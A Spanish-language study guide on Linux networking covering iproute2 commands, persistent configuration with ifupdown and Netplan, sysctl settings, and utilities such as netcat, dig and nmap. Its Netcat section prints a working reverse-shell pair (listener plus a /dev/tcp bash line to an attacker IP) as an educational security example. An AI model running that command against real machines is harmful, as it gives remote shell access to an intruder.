# Configuración de red

## Índice

1. [Configuración de red de forma no persistente](#1-configuración-de-red-de-forma-no-persistente)
   1. [Gestión de parámetros de enlace](#gestión-de-parámetros-de-enlace)
   2. [Gestión de tabla ARP (capa de enlace)](#gestión-de-tabla-arp-capa-de-enlace)
   3. [Gestión de direcciones IP (capa de red)](#gestión-de-direcciones-ip-capa-de-red)
   4. [Configuración de rutas (capa de red)](#configuración-de-rutas-capa-de-red)
   5. [Fichero /etc/hosts](#fichero-etchosts)
2. [Configuración de red de forma persistente](#2-configuración-de-red-de-forma-persistente)
   1. [Uso de /etc/network/interfaces.d (sistema Debian)](#uso-de-etcnetworkinterfacesd-sistema-debian)
   2. [Netplan (Ubuntu > 20.04)](#netplan-ubuntu--2004)
3. [Otros parámetros relevantes de la red](#3-otros-parámetros-relevantes-de-la-red)
   1. [Reenvío IP](#reenvío-ip)
   2. [Desactivar la respuesta de paquetes ICMP](#desactivar-la-respuesta-de-paquetes-icmp)
4. [Herramientas de utilidad de red](#4-herramientas-de-utilidad-de-red)
   1. [ping](#ping)
   2. [Netcat](#netcat)
   3. [nmcli](#nmcli)
   4. [hostnamectl](#hostnamectl)
   5. [Configurar el cliente de DNS](#configurar-el-cliente-de-dns)
   6. [Comando dig](#comando-dig)
   7. [Comando host](#comando-host)
   8. [Comando getent](#comando-getent)
   9. [Comando nmap](#comando-nmap)
5. [Configuración de proxy en Debian](#5-configuración-de-proxy-en-debian)

---

## 1. Configuración de red de forma no persistente

Hasta la primera década del siglo XXI, los comandos `ifconfig` y `route` se utilizaban para realizar configuraciones de red. En **GNU/Linux** (Debian/Ubuntu), estas utilidades se distribuían dentro del paquete `net-tools`, el cual fue declarado obsoleto en 2011. Actualmente, se recomienda la migración al estándar **iproute2**. 

Todas las utilidades de configuración incluidas en `net-tools` se han unificado en **iproute2** bajo el comando `ip`.

> **Nota:** Al usar el comando `ip`, no es necesario escribir completamente sus argumentos. Solo hace falta escribir la parte mínima para desambiguar. Por ejemplo, `ip address show` se puede resumir en `ip a s`. Si el último parámetro es `show`, se puede omitir (ej. `ip a`).

### Gestión de parámetros de enlace

La gestión de parámetros de la capa de enlace se hace con el comando `ip link`. Esto permite consultar los parámetros de enlace, cambiar el estado (`up`/`down`), el nombre de la interfaz, el MTU o la dirección MAC.

| Comando `ip link` | Definición |
|-------------------|------------|
| `ip link show` | Permite ver los datos de la interfaz relativos a la capa de enlace. |
| `ip link set enp0s8 down` | Desactiva la interfaz especificada (usar `up` para activarla). |
| `ip link set enp0s8 name eth2` | Renombra la interfaz `enp0s8` a `eth2`. No se permite cambiar si la interfaz está activa. |
| `ip link set enp0s8 address 02:01...` | Cambia la dirección MAC. La interfaz debe estar apagada. |
| `ip link set enp0s8 mtu 1200` | Cambia el MTU (tamaño máximo de trama). Por defecto en Ethernet es 1500. |
| `ip link set enp0s8 multicast off`| Desactiva el tráfico multicast. (Usar `on` para activar). |
| `ip link set enp0s8 txqueuelen 2000`| Establece el tamaño de la cola de envío de tramas a 2000. |
| `ip link set dev enp0s8 promisc on`| Activa el modo promiscuo para interceptar todo el tráfico que llegue al adaptador de red. |

### Gestión de tabla ARP (capa de enlace)

El protocolo **ARP (Address Resolution Protocol)** permite obtener direcciones MAC de otros equipos del mismo segmento de red dada su dirección IP. Se emplea una caché llamada **tabla ARP** para almacenar asociaciones de IP-MAC temporalmente.

El manejo de la tabla ARP se realiza con el comando `ip neighbour`.

| Comando `ip neighbour` | Definición |
|------------------------|------------|
| `ip neighbour show` | Muestra la tabla de ARP (vecinos) del equipo. |
| `ip neighbour flush dev enp0s8` | Borra todas las entradas ARP asociadas a la interfaz `enp0s8`. |
| `ip neighbour del lladdr MAC to IP dev...`| Borra una entrada ARP específica (MAC e IP). |
| `ip neighbour add IP lladdr MAC dev...` | Añade manualmente una entrada ARP permanente a la tabla. |

### Gestión de direcciones IP (capa de red)

La gestión se hace con `ip address`. Cada dispositivo debe tener al menos una dirección de red. 

| Comando `ip address` | Definición |
|----------------------|------------|
| `ip address show dev enp0s8` | Muestra las direcciones IP de `enp0s8`. |
| `ip address flush dev enp0s8` | Elimina todas las direcciones IP de la interfaz. |
| `ip address add IP/MASCARA dev enp0s8` | Añade una dirección IP a la interfaz especificada. |
| `ip address del IP/MASCARA dev enp0s8` | Elimina una dirección IP de la interfaz. |

> **Nota:** Al configurar una dirección IP, Linux añade automáticamente la ruta directa hacia la red asociada a esa IP.

### Configuración de rutas (capa de red)

La gestión de rutas (estáticas) se hace con el comando `ip route`.

| Comando `ip route` | Definición |
|--------------------|------------|
| `ip route show` | Muestra la tabla de enrutamiento actual. |
| `ip route add RED/MASCARA dev enp0s8` | Añade una ruta directa hacia la red a través del dispositivo especificado. |
| `ip route del RED/MASCARA` | Borra la entrada correspondiente de la tabla de rutas. |
| `ip route add RED/MASCARA via IP_GW` | Añade una ruta que pasa a través de una puerta de enlace (`gateway`). |
| `ip route add default via IP_GW` | Añade la ruta por defecto (`default gateway`). |
| `ip route del default` | Borra la ruta por defecto. |

### Fichero `/etc/hosts`

El fichero `/etc/hosts` es un archivo de texto plano que asocia nombres legibles con direcciones IP. Funciona como un solucionador DNS local y se consulta antes de enviar peticiones a servidores DNS externos.

```bash
# Ejemplo de /etc/hosts
127.0.0.1       localhost
127.0.1.1       usuario

# Servidores
192.168.1.10    servidor.local
```

---

## 2. Configuración de red de forma persistente

Para hacer permanente la configuración, se puede usar:
- **NetworkManager**: Usado mayormente en distribuciones de escritorio.
- **Netplan** (`/etc/netplan/*`): Introducido en Ubuntu 20.04.
- **ifupdown/interfaces** (`/etc/network/interfaces`): Tradicional en Debian y servidores clásicos.

### Uso de `/etc/network/interfaces.d` (sistema Debian)

```bash
# Configuración DHCP (IPv4 e IPv6)
auto enp0s8
allow-hotplug enp0s8
iface enp0s8 inet dhcp
iface enp0s8 inet6 dhcp

# Configuración estática (IPv4)
auto enp0s8
allow-hotplug enp0s8
iface enp0s8 inet static
    address 192.168.2.7
    netmask 255.255.255.0
    gateway 192.168.2.1
```

> **Aviso:** Cuando se emplea este archivo, es necesario configurar los servidores DNS manualmente en el fichero `/etc/resolv.conf`.

### Netplan (Ubuntu > 20.04)

Netplan utiliza YAML para configurar la red y reside en `/etc/netplan/`.

```yaml
# Ejemplo: /etc/netplan/01-netcfg.yaml
network:
  version: 2
  ethernets:
    enp0s3:
      dhcp4: true
    enp0s8:
      dhcp4: no
      addresses:
        - 192.168.121.221/24
      routes:
        - to: default
          via: 192.168.121.1
      nameservers:
        addresses:
          - 8.8.8.8
          - 1.1.1.1
```

Para validar y aplicar los cambios:

```bash
sudo netplan try
sudo netplan apply
```

---

## 3. Otros parámetros relevantes de la red

### Reenvío IP

Por defecto, Linux funciona como `workstation` (descarta paquetes si la IP destino no es la suya). Para que actúe como router, se debe activar el **Reenvío IP** (`IP Forwarding`).

Esto se puede activar de forma temporal modificando el archivo `/proc`:

```bash
sysctl net.ipv4.ip_forward=1
```

### Desactivar la respuesta de paquetes ICMP

Para evitar que el servidor responda a peticiones PING (`echo request`), podemos alterar los parámetros del kernel temporalmente o de forma persistente en `/etc/sysctl.conf`:

```bash
# Hacer cambios persistentes en /etc/sysctl.conf
net.ipv4.ip_forward = 1
net.ipv4.icmp_echo_ignore_all = 1
```

---

## 4. Herramientas de utilidad de red

### ping

Verifica conectividad ICMP con otro host.

```bash
# -c: Número de ecos a emitir
# -I: Interfaz específica
# -b: Envío a IP de broadcast
ping -c 1 10.9.238.170
ping -I eth0 192.168.1.60
```

### Netcat

`nc` es la "navaja suiza" de las redes. Permite abrir puertos, crear clientes TCP/UDP, y comprobar puertos abiertos.

*   `nc -l -p 8080`: Pone a la máquina a escuchar en el puerto TCP 8080.
*   `nc -z -v localhost 22`: Verifica si el puerto 22 está abierto (escaneo).

**Ejemplo de Chat simple:**

```bash
# Servidor
nc -l -p 2000

# Cliente
nc 192.168.112.1 2000
```

> **Seguridad (Reverse Shell):** Netcat se utiliza habitualmente en ciberseguridad para lanzar `reverse shells`.

```bash
# 1. El atacante escucha en el puerto 1331
nc -lvnp 1331

# 2. La víctima ejecuta el script hacia el atacante (192.168.100.250)
/bin/bash -i >& /dev/tcp/192.168.100.250/1331 0>&1
```

### nmcli

Herramienta CLI para interactuar con **NetworkManager**.

*   Permite gestionar interfaces, configurar IPs (DHCP/Estática), conexiones WiFi o VPN y rutas. Muy útil para scripts automatizados.

### hostnamectl

Muestra y permite configurar el nombre del equipo, administrado por `systemd`.

```bash
hostnamectl set-hostname service.curso.local
systemctl restart systemd-hostnamed
```

### Configurar el cliente de DNS

Edición manual de `/etc/resolv.conf`:

```bash
nameserver 8.8.8.8
nameserver 8.8.4.4
domain curso.local
search localdomain curso.local
```

### Comando dig

Consulta avanzada a servidores DNS para extraer registros (A, MX, TXT, etc.).

```bash
dig a +short www.aibench.org
```

### Comando host

Alternativa simplificada a `dig` para resolución DNS rápida.

```bash
host tele2.es
```

### Comando getent

Consulta bases de datos del sistema controladas por NSS (Name Service Switch) en `/etc/nsswitch.conf`. 

```bash
getent passwd operador   # Extrae la línea de /etc/passwd
getent group             # Extrae los grupos
getent hosts google.com  # Resuelve la IP local/externa
```

### Comando nmap

Herramienta avanzada de escaneo de puertos, detección de versiones y OS.

```bash
apt install nmap -y
nmap -v -A 192.168.1.125
```

> **Nota:** La opción `-A` activa detección de SO, versiones de servicios, scripts de reconocimiento (NSE) y traceroute. La opción `-v` aumenta la verbosidad de salida.

---

## 5. Configuración de proxy en Debian

Para configurar un proxy global en el sistema se pueden declarar variables de entorno en un archivo dedicado, como `/etc/profile.d/proxy.sh`.

```bash
# http/https
export http_proxy="http://xx.xx.xx.xx:yyyy/"
export https_proxy="http://xx.xx.xx.xx:yyyy/"

# curl
export HTTP_PROXY="http://xx.xx.xx.xx:yyyy/"
export HTTPS_PROXY="http://xx.xx.xx.xx:yyyy/"
```

Luego se aplican las variables con `source`:

```bash
source /etc/profile.d/proxy.sh
```

> **Nota:** Para que las aplicaciones ejecutadas con `sudo` conserven estas variables, se debe añadir al archivo `/etc/sudoers`:
> ```bash
> Defaults        env_keep += "http_proxy https_proxy HTTP_PROXY HTTPS_PROXY"
> ```
